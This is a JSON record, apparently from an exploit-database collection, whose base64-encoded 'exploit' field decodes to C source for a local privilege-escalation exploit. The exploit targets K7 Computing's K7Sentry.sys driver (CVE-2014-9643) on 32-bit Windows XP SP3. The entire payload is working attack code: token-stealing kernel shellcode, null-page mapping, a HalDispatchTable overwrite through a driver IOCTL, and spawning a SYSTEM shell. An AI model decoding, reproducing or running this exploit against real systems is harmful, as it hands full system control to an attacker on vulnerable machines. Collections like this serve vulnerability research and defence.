{
    "source": "exploit-database", 
    "exploit": "77u/LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIEs3IENvbXB1dGluZyBNdWx0aXBsZSBQcm9kdWN0cyBBcmJpdHJhcnkgV3JpdGUgUHJpdmlsZWdlIEVzY2FsYXRpb24NCkRhdGUgICAgICAgICAgICAgLSAwNHRoIEZlYnJ1YXJ5IDIwMTUNCkRpc2NvdmVyZWQgYnkgICAgLSBQYXJ2ZXogQW53YXIgKEBwYXJ2ZXpnaGgpDQpWZW5kb3IgSG9tZXBhZ2UgIC0gaHR0cDovL3d3dy5rN2NvbXB1dGluZy5jby51ay8NClRlc3RlZCBWZXJzaW9uICAgLSAxNC4yLjAuMjQwDQpEcml2ZXIgVmVyc2lvbiAgIC0gMTIuOC4wLjEwNCAtIEs3U2VudHJ5LnN5cw0KVGVzdGVkIG9uIE9TICAgICAtIDMyYml0IFdpbmRvd3MgWFAgU1AzIA0KT1NWREIgICAgICAgICAgICAtIGh0dHA6Ly93d3cub3N2ZGIub3JnL3Nob3cvb3N2ZGIvMTEzMDA3DQpDVkUgSUQgICAgICAgICAgIC0gQ1ZFLTIwMTQtOTY0Mw0KVmVuZG9yIGZpeCB1cmwgICAtIG5vbmUNCkZpeGVkIHZlcnNpb24gICAgLSAxNC4yLjAuMjUzDQpGaXhlZCBkcml2ZXIgdmVyIC0gMTIuOC4wLjExOCANCg0KKi8NCg0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx3aW5kb3dzLmg+DQoNCiNkZWZpbmUgSU5CVUZTSVpFIDQNCiNkZWZpbmUgQlVGU0laRSA0MDk2ICANCg0KDQp0eXBlZGVmIHN0cnVjdCBfU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSB7DQogICAgIFBWT0lEICAgVW5rbm93bjE7DQogICAgIFBWT0lEICAgVW5rbm93bjI7DQogICAgIFBWT0lEICAgQmFzZTsNCiAgICAgVUxPTkcgICBTaXplOw0KICAgICBVTE9ORyAgIEZsYWdzOw0KICAgICBVU0hPUlQgIEluZGV4Ow0KICAgICBVU0hPUlQgIE5hbWVMZW5ndGg7DQogICAgIFVTSE9SVCAgTG9hZENvdW50Ow0KICAgICBVU0hPUlQgIFBhdGhMZW5ndGg7DQogICAgIENIQVIgICAgSW1hZ2VOYW1lWzI1Nl07DQp9IFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT05fRU5UUlksICpQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWTsNCiANCnR5cGVkZWYgc3RydWN0IF9TWVNURU1fTU9EVUxFX0lORk9STUFUSU9OIHsNCiAgICAgVUxPTkcgICBDb3VudDsNCiAgICAgU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSBNb2R1bGVbMV07DQp9IFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04sICpQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTjsNCg0KdHlwZWRlZiBlbnVtIF9TWVNURU1fSU5GT1JNQVRJT05fQ0xBU1MgeyANCiAgICAgU3lzdGVtTW9kdWxlSW5mb3JtYXRpb24gPSAxMSwNCiAgICAgU3lzdGVtSGFuZGxlSW5mb3JtYXRpb24gPSAxNg0KfSBTWVNURU1fSU5GT1JNQVRJT05fQ0xBU1M7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikoDQogICAgIFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyBTeXN0ZW1JbmZvcm1hdGlvbkNsYXNzLA0KICAgICBQVk9JRCBTeXN0ZW1JbmZvcm1hdGlvbiwNCiAgICAgVUxPTkcgU3lzdGVtSW5mb3JtYXRpb25MZW5ndGgsDQogICAgIFBVTE9ORyBSZXR1cm5MZW5ndGgpOw0KDQp0eXBlZGVmIE5UU1RBVFVTIChXSU5BUEkgKl9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKSgNCiAgICAgRFdPUkQgUHJvZmlsZVNvdXJjZSwgDQogICAgIFBVTE9ORyBJbnRlcnZhbCk7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050QWxsb2NhdGVWaXJ0dWFsTWVtb3J5KSgNCiAgICAgSU4gSEFORExFIFByb2Nlc3NIYW5kbGUsDQogICAgIElOIE9VVCBQVk9JRCAqQmFzZUFkZHJlc3MsDQogICAgIElOIFVMT05HIFplcm9CaXRzLA0KICAgICBJTiBPVVQgUFVMT05HIFJlZ2lvblNpemUsDQogICAgIElOIFVMT05HIEFsbG9jYXRpb25UeXBlLA0KICAgICBJTiBVTE9ORyBQcm90ZWN0KTsNCg0KdHlwZWRlZiB2b2lkICgqRlVOQ1RQVFIpKCk7IA0KDQoNCg0KLy8gV2luZG93cyBYUCBTUDMNCg0KI2RlZmluZSBYUF9LUFJPQ0VTUyAweDQ0ICAgICAgLy8gT2Zmc2V0IHRvIF9LUFJPQ0VTUyBmcm9tIGEgX0VUSFJFQUQgc3RydWN0DQojZGVmaW5lIFhQX1RPS0VOICAgIDB4YzggICAgICAvLyBPZmZzZXQgdG8gVE9LRU4gZnJvbSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBYUF9VUElEICAgICAweDg0ICAgICAgLy8gT2Zmc2V0IHRvIFVuaXF1ZVByb2Nlc3NJZCBGUk9NIHRoZSBfRVBST0NFU1Mgc3RydWN0DQojZGVmaW5lIFhQX0FQTElOS1MgIDB4ODggICAgICAvLyBPZmZzZXQgdG8gQWN0aXZlUHJvY2Vzc0xpbmtzIF9FUFJPQ0VTUyBzdHJ1Y3QNCg0KDQpCWVRFIHRva2VuX3N0ZWFsX3hwW10gPQ0Kew0KICAweDUyLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCBlZHggICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWR4IG9uIHRoZSBzdGFjaw0KICAweDUzLAkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCBlYnggICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWJ4IG9uIHRoZSBzdGFjaw0KICAweDMzLDB4YzAsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8geG9yIGVheCwgZWF4ICAgICAgICAgICAgICAgICAgIGVheCA9IDANCiAgMHg2NCwweDhiLDB4ODAsMHgyNCwweDAxLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGZzOltlYXgrMTI0aF0gICAgICAgICBSZXRyaWV2ZSBFVEhSRUFEDQogIDB4OGIsMHg0MCxYUF9LUFJPQ0VTUywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBbZWF4K1hQX0tQUk9DRVNTXSAgICAgUmV0cmlldmUgX0tQUk9DRVNTDQogIDB4OGIsMHhjOCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWN4LCBlYXgNCiAgMHg4YiwweDk4LFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYngsIFtlYXgrWFBfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4NCiAgMHg4YiwweDgwLFhQX0FQTElOS1MsMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIFtlYXgrWFBfQVBMSU5LU10gPC18ICBSZXRyaWV2ZSBGTElOSyBmcm9tIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4ZTgsWFBfQVBMSU5LUywweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgLy8gc3ViIGVheCwgWFBfQVBMSU5LUyAgICAgICAgIHwgIFJldHJpZXZlIF9FUFJPQ0VTUyBQb2ludGVyIGZyb20gdGhlIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4YjgsWFBfVVBJRCwweDAwLDB4MDAsMHgwMCwweDA0LDB4MDAsMHgwMCwweDAwLCAgLy8gY21wIFtlYXgrWFBfVVBJRF0sIDQgICAgICAgIHwgIENvbXBhcmVzIFVuaXF1ZVByb2Nlc3NJZCB3aXRoIDQgKFN5c3RlbSBQcm9jZXNzKQ0KICAweDc1LDB4ZTgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gam5lICAgICAgICAgICAgICAgICAgICAgLS0tLSANCiAgMHg4YiwweDkwLFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlZHgsIFtlYXgrWFBfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4gYW5kIHN0b3JlcyBvbiBFRFgNCiAgMHg4YiwweGMxLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGVjeCAgICAgICAgICAgICAgICAgICBSZXRyaWV2ZXMgS1BST0NFU1Mgc3RvcmVkIG9uIEVDWA0KICAweDg5LDB4OTAsWFBfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAgLy8gbW92IFtlYXgrWFBfVE9LRU5dLCBlZHggICAgICAgIE92ZXJ3cml0ZXMgdGhlIFRPS0VOIGZvciB0aGUgY3VycmVudCBLUFJPQ0VTUw0KICAweDViLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVieCAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVieA0KICAweDVhLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVkeCAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVkeA0KICAweGMyLDB4MDggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcmV0IDggICAgICAgICAgICAgICAgICAgICAgICAgIEF3YXkgZnJvbSB0aGUga2VybmVsICAgDQp9Ow0KDQoNCg0KRFdPUkQgSGFsRGlzcGF0Y2hUYWJsZUFkZHJlc3MoKSANCnsNCiAgICBfTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uICAgIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbjsNCiAgICBQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiAgIHBNb2R1bGVJbmZvOw0KICAgIERXT1JEICAgICAgICAgICAgICAgICAgICAgICAgSGFsRGlzcGF0Y2hUYWJsZTsNCiAgICBDSEFSICAgICAgICAgICAgICAgICAgICAgICAgIGtGdWxsTmFtZVsyNTZdOw0KICAgIFBWT0lEICAgICAgICAgICAgICAgICAgICAgICAga0Jhc2UgPSBOVUxMOw0KICAgIExQU1RSICAgICAgICAgICAgICAgICAgICAgICAga05hbWU7DQogICAgSE1PRFVMRSAgICAgICAgICAgICAgICAgICAgICBLZXJuZWw7DQogICAgRlVOQ1RQVFIgICAgICAgICAgICAgICAgICAgICBIYWw7DQogICAgVUxPTkcgICAgICAgICAgICAgICAgICAgICAgICBsZW47DQogICAgTlRTVEFUVVMgICAgICAgICAgICAgICAgICAgICBzdGF0dXM7DQoNCg0KICAgIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiA9IChfTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKUdldFByb2NBZGRyZXNzKEdldE1vZHVsZUhhbmRsZSgibnRkbGwuZGxsIiksICJOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24iKTsNCiAJDQogICAgaWYgKCFOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24pDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBVbmFibGUgdG8gcmVzb2x2ZSBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb25cblxuIik7DQogICAgICAgIHJldHVybiAtMTsgIA0KICAgIH0NCg0KICAgIHN0YXR1cyA9IE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbiwgTlVMTCwgMCwgJmxlbik7DQoNCiAgICBpZiAoIXN0YXR1cykgDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBBbiBlcnJvciBvY2N1cmVkIHdoaWxlIHJlYWRpbmcgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uLiBTdGF0dXMgPSAweCUwOHhcblxuIiwgc3RhdHVzKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCgkJDQogICAgcE1vZHVsZUluZm8gPSAoUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04pR2xvYmFsQWxsb2MoR01FTV9aRVJPSU5JVCwgbGVuKTsNCg0KICAgIGlmKHBNb2R1bGVJbmZvID09IE5VTEwpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBBbiBlcnJvciBvY2N1cnJlZCB3aXRoIEdsb2JhbEFsbG9jIGZvciBwTW9kdWxlSW5mb1xuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIHN0YXR1cyA9IE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbiwgcE1vZHVsZUluZm8sIGxlbiwgJmxlbik7DQoJDQogICAgbWVtc2V0KGtGdWxsTmFtZSwgMHgwMCwgc2l6ZW9mKGtGdWxsTmFtZSkpOw0KICAgIHN0cmNweV9zKGtGdWxsTmFtZSwgc2l6ZW9mKGtGdWxsTmFtZSktMSwgcE1vZHVsZUluZm8tPk1vZHVsZVswXS5JbWFnZU5hbWUpOw0KICAgIGtCYXNlID0gcE1vZHVsZUluZm8tPk1vZHVsZVswXS5CYXNlOw0KDQogICAgcHJpbnRmKCJbaV0gS2VybmVsIGJhc2UgbmFtZSAlc1xuIiwga0Z1bGxOYW1lKTsNCiAgICBrTmFtZSA9IHN0cnJjaHIoa0Z1bGxOYW1lLCAnXFwnKTsNCg0KICAgIEtlcm5lbCA9IExvYWRMaWJyYXJ5QSgrK2tOYW1lKTsNCg0KICAgIGlmKEtlcm5lbCA9PSBOVUxMKSANCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBsb2FkIGtlcm5lbCBiYXNlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgSGFsID0gKEZVTkNUUFRSKUdldFByb2NBZGRyZXNzKEtlcm5lbCwgIkhhbERpc3BhdGNoVGFibGUiKTsNCg0KICAgIGlmKEhhbCA9PSBOVUxMKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIGZpbmQgSGFsRGlzcGF0Y2hUYWJsZVxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICANCiAgICBwcmludGYoIltpXSBIYWxEaXNwYXRjaFRhYmxlIGFkZHJlc3MgMHglMDh4XG4iLCBIYWwpOwkNCiAgICBwcmludGYoIltpXSBLZXJuZWwgaGFuZGxlIDB4JTA4eFxuIiwgS2VybmVsKTsNCiAgICBwcmludGYoIltpXSBLZXJuZWwgYmFzZSBhZGRyZXNzIDB4JTA4eFxuIiwga0Jhc2UpOyAgICAgICAgICANCg0KICAgIEhhbERpc3BhdGNoVGFibGUgPSAoKERXT1JEKUhhbCAtIChEV09SRClLZXJuZWwgKyAoRFdPUkQpa0Jhc2UpOw0KDQogICAgcHJpbnRmKCJbK10gS2VybmVsIGFkZHJlc3Mgb2YgSGFsRGlzcGF0Y2hUYWJsZSAweCUwOHhcbiIsIEhhbERpc3BhdGNoVGFibGUpOw0KDQogICAgaWYoIUhhbERpc3BhdGNoVGFibGUpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gY2FsY3VsYXRlIEhhbERpc3BhdGNoVGFibGVcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICByZXR1cm4gSGFsRGlzcGF0Y2hUYWJsZTsNCn0NCg0KDQoNCmludCBHZXRXaW5kb3dzVmVyc2lvbigpDQp7DQogICAgaW50IHYgPSAwOw0KICAgIERXT1JEIHZlcnNpb24gPSAwLCBtaW5WZXJzaW9uID0gMCwgbWFqVmVyc2lvbiA9IDA7DQoNCiAgICB2ZXJzaW9uID0gR2V0VmVyc2lvbigpOw0KDQogICAgbWluVmVyc2lvbiA9IChEV09SRCkoSElCWVRFKExPV09SRCh2ZXJzaW9uKSkpOw0KICAgIG1halZlcnNpb24gPSAoRFdPUkQpKExPQllURShMT1dPUkQodmVyc2lvbikpKTsNCg0KICAgIGlmIChtaW5WZXJzaW9uID09IDEgJiYgbWFqVmVyc2lvbiA9PSA1KSB2ID0gMTsgIC8vICJXaW5kb3dzIFhQOw0KICAgIGlmIChtaW5WZXJzaW9uID09IDEgJiYgbWFqVmVyc2lvbiA9PSA2KSB2ID0gMjsgIC8vICJXaW5kb3dzIDciOw0KICAgIGlmIChtaW5WZXJzaW9uID09IDIgJiYgbWFqVmVyc2lvbiA9PSA1KSB2ID0gMzsgIC8vICJXaW5kb3dzIFNlcnZlciAyMDAzOw0KDQogICAgcmV0dXJuIHY7DQp9DQoNCg0Kdm9pZCBzcGF3blNoZWxsKCkNCnsNCiAgICBTVEFSVFVQSU5GT0Egc2k7DQogICAgUFJPQ0VTU19JTkZPUk1BVElPTiBwaTsNCg0KDQogICAgWmVyb01lbW9yeSgmcGksIHNpemVvZihwaSkpOw0KICAgIFplcm9NZW1vcnkoJnNpLCBzaXplb2Yoc2kpKTsNCiAgICBzaS5jYiA9IHNpemVvZihzaSk7DQoNCiAgICBzaS5jYiAgICAgICAgICA9IHNpemVvZihzaSk7IA0KICAgIHNpLmR3RmxhZ3MgICAgID0gU1RBUlRGX1VTRVNIT1dXSU5ET1c7DQogICAgc2kud1Nob3dXaW5kb3cgPSBTV19TSE9XTk9STUFMOw0KDQogICAgaWYgKCFDcmVhdGVQcm9jZXNzKE5VTEwsICJjbWQuZXhlIiwgTlVMTCwgTlVMTCwgVFJVRSwgQ1JFQVRFX05FV19DT05TT0xFLCBOVUxMLCBOVUxMLCAmc2ksICZwaSkpDQogICAgew0KICAgICAgICBwcmludGYoIlxuWy1dIENyZWF0ZVByb2Nlc3MgZmFpbGVkICglZClcblxuIiwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7DQogICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOw0KfQ0KDQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIA0Kew0KDQogICAgX050QWxsb2NhdGVWaXJ0dWFsTWVtb3J5ICAgIE50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5Ow0KICAgIF9OdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlICAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlOw0KICAgIEJZVEUgICAgICAgICAgICAgICAgICAgICAgICAqaW5idWZmZXI7DQogICAgTlRTVEFUVVMgICAgICAgICAgICAgICAgICAgIGFsbG9jc3RhdHVzOw0KICAgIExQVk9JRCAgICAgICAgICAgICAgICAgICAgICBiYXNlX2FkZHIgPSAoTFBWT0lEKTB4MDAwMDAwMDE7DQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgIHNpemUgPSBCVUZTSVpFOyAgICAgICAgICAgICAgICAgICAgICAgDQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgIHdyaXR0ZW47DQogICAgaW50ICAgICAgICAgICAgICAgICAgICAgICAgIHJ3cmVzdWx0Ow0KICAgIHVuc2lnbmVkIGNoYXIgICAgICAgICAgICAgICBidWZmZXJbQlVGU0laRV07ICAgIA0KICAgIEhBTkRMRSAgICAgICAgICAgICAgICAgICAgICBoRGV2aWNlOw0KICAgIERXT1JEICAgICAgICAgICAgICAgICAgICAgICBkd1JldEJ5dGVzID0gMDsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgSGFsRGlzcGF0Y2hUYWJsZVRhcmdldDsgICAgICAgICAgICAgICAgIA0KICAgIFVMT05HICAgICAgICAgICAgICAgICAgICAgICB0aW1lID0gMDsNCiAgICB1bnNpZ25lZCBjaGFyICAgICAgICAgICAgICAgZGV2aGFuZGxlW01BWF9QQVRIXTsgDQoNCg0KICAgIHByaW50ZigiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIik7DQogICAgcHJpbnRmKCIgICBLNyBDb21wdXRpbmcgTXVsdGlwbGUgUHJvZHVjdHMgKEs3U2VudHJ5LnN5cykgQXJiaXRyYXJ5IFdyaXRlIEVvUCBFeHBsb2l0ICAgXG4iKTsNCiAgICBwcmludGYoIiAgICAgICAgICAgICAgICAgICAgICAgICBUZXN0ZWQgb24gV2luZG93cyBYUCBTUDMgKDMyYml0KSAgICAgICAgICAgICAgICAgICAgICBcbiIpOw0KICAgIHByaW50ZigiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG4iKTsNCg0KICAgIGlmIChHZXRXaW5kb3dzVmVyc2lvbigpID09IDEpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbaV0gUnVubmluZyBXaW5kb3dzIFhQXG4iKTsNCiAgICB9DQoNCiAgICBpZiAoR2V0V2luZG93c1ZlcnNpb24oKSA9PSAwKSANCiAgICB7DQogICAgICAgIHByaW50ZigiW2ldIEV4cGxvaXQgbm90IHN1cHBvcnRlZCBvbiB0aGlzIE9TXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfSAgDQoNCiAgICBzcHJpbnRmKGRldmhhbmRsZSwgIlxcXFwuXFwlcyIsICJLN1NlbnRyeSIpOw0KDQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSA9IChfTnRRdWVyeUludGVydmFsUHJvZmlsZSlHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeUludGVydmFsUHJvZmlsZSIpOw0KIAkNCiAgICBpZiAoIU50UXVlcnlJbnRlcnZhbFByb2ZpbGUpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBVbmFibGUgdG8gcmVzb2x2ZSBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQogICANCiAgICBOdEFsbG9jYXRlVmlydHVhbE1lbW9yeSA9IChfTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkpR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIk50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5Iik7DQogCQ0KICAgIGlmICghTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBVbmFibGUgdG8gcmVzb2x2ZSBOdEFsbG9jYXRlVmlydHVhbE1lbW9yeVxuIik7DQogICAgICAgIHJldHVybiAtMTsgIA0KICAgIH0NCgkgDQogICAgYWxsb2NzdGF0dXMgPSBOdEFsbG9jYXRlVmlydHVhbE1lbW9yeShJTlZBTElEX0hBTkRMRV9WQUxVRSwgJmJhc2VfYWRkciwgMCwgJnNpemUsIE1FTV9DT01NSVQgfCBNRU1fUkVTRVJWRSwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQoNCiAgICBpZiAoYWxsb2NzdGF0dXMpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQW4gZXJyb3Igb2NjdXJlZCB3aGlsZSBtYXBwaW5nIGV4ZWN1dGFibGUgbWVtb3J5LiBTdGF0dXMgPSAweCUwOHhcbiIsIGFsbG9jc3RhdHVzKTsNCiAgICAgICAgcHJpbnRmKCJFcnJvciA6ICVkXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgcHJpbnRmKCJbK10gTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkgYWxsb2NhdGVkIG1lbW9yeSBhdCAweCUuOHhcbiIsIGJhc2VfYWRkcik7DQoNCiAgICBtZW1zZXQoYnVmZmVyLCAweDkwLCBCVUZTSVpFKTsNCiAgICBtZW1jcHkoYnVmZmVyKzB4MDAwMDAwMDUsIHRva2VuX3N0ZWFsX3hwLCBzaXplb2YodG9rZW5fc3RlYWxfeHApKTsNCg0KICAgIHByaW50ZigiW2ldIFNpemUgb2Ygc2hlbGxjb2RlICVkIGJ5dGVzXG4iLCBzaXplb2YodG9rZW5fc3RlYWxfeHApKTsNCg0KICAgIHJ3cmVzdWx0ID0gV3JpdGVQcm9jZXNzTWVtb3J5KElOVkFMSURfSEFORExFX1ZBTFVFLCAoTFBWT0lEKTB4MDAwMDAwMDEsIGJ1ZmZlciwgQlVGU0laRSwgJndyaXR0ZW4pOw0KDQogICAgaWYgKHJ3cmVzdWx0ID09IDApDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBBbiBlcnJvciBvY2N1cmVkIHdoaWxlIG1hcHBpbmcgd3JpdGluZyBtZW1vcnk6ICVkXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgcHJpbnRmKCJbK10gV3JpdGVQcm9jZXNzTWVtb3J5ICVkIGJ5dGVzIHdyaXR0ZW5cbiIsIHdyaXR0ZW4pOyAgDQogICAgCQ0KICAgIGhEZXZpY2UgPSBDcmVhdGVGaWxlKGRldmhhbmRsZSwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSwgTlVMTCwgT1BFTl9FWElTVElORyAsIDAsIE5VTEwpOw0KICAgIA0KICAgIGlmIChoRGV2aWNlID09IElOVkFMSURfSEFORExFX1ZBTFVFKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQ3JlYXRlRmlsZSBvcGVuICVzIGRldmljZSBmYWlsZWQgKCVkKVxuXG4iLCBkZXZoYW5kbGUsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBlbHNlIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbK10gT3BlbiAlcyBkZXZpY2Ugc3VjY2Vzc2Z1bFxuIiwgZGV2aGFuZGxlKTsNCiAgICB9DQoNCiAgICBpbmJ1ZmZlciA9IFZpcnR1YWxBbGxvYyhOVUxMLCBJTkJVRlNJWkUsIE1FTV9DT01NSVQgfCBNRU1fUkVTRVJWRSwgUEFHRV9SRUFEV1JJVEUpOw0KICAgIG1lbXNldChpbmJ1ZmZlciwgMHg0MSwgSU5CVUZTSVpFKTsgICANCg0KICAgIEhhbERpc3BhdGNoVGFibGVUYXJnZXQgPSBIYWxEaXNwYXRjaFRhYmxlQWRkcmVzcygpICsgc2l6ZW9mKERXT1JEKTsNCiAgICBwcmludGYoIlsrXSBIYWxEaXNwYXRjaFRhYmxlKzQgKDB4JTA4eCkgd2lsbCBiZSBvdmVyd3JpdHRlblxuIiwgSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCk7DQogCQ0KICAgIHByaW50ZigiW35dIFByZXNzIGFueSBrZXkgdG8gc2VuZCBFeHBsb2l0ICAuIC4gLlxuIik7DQogICAgZ2V0Y2goKTsNCg0KICAgIERldmljZUlvQ29udHJvbChoRGV2aWNlLCAweDk1MDAyNTcwLCBpbmJ1ZmZlciwgSU5CVUZTSVpFLCAoTFBWT0lEKUhhbERpc3BhdGNoVGFibGVUYXJnZXQsIDAsICZkd1JldEJ5dGVzLCBOVUxMKTsNCg0KICAgIHByaW50ZigiWytdIEJ1ZmZlciBzZW50XG4iKTsNCiAgICBDbG9zZUhhbmRsZShoRGV2aWNlKTsNCg0KICAgIHByaW50ZigiWytdIFNwYXduaW5nIFNZU1RFTSBTaGVsbFxuIik7DQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSgyLCAmdGltZSk7DQogICAgc3Bhd25TaGVsbCgpOw0KDQogICAgcmV0dXJuIDA7DQp9", 
    "filename": "platforms/windows/local/35992.c", 
    "id": "35992", 
    "cves": [
        "CVE-2014-9643"
    ]
}